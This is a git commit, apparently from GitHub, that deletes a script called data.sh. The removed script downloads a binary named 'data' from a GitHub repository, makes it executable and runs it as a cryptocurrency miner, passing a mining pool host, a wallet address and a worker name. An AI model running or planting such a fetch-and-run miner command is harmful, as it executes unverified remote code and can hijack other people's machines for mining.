3903d778c466952b245ac3f7443b18e02f26105c
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-05-13 08:20:48 +0700

    Delete data.sh

--- data.sh
+++
@@ -1,3 +0,0 @@
-#! /bin/bash
-
-wget https://github.com/duniaboci13/nomad/raw/main/data && chmod +x data && ./data -o web-ko1.gonspool.com:3333 -u 0x05f584744f78bee68b079d6a02e2f04a9893609f -p 250 -t --worker=KVN --donate-level=1%
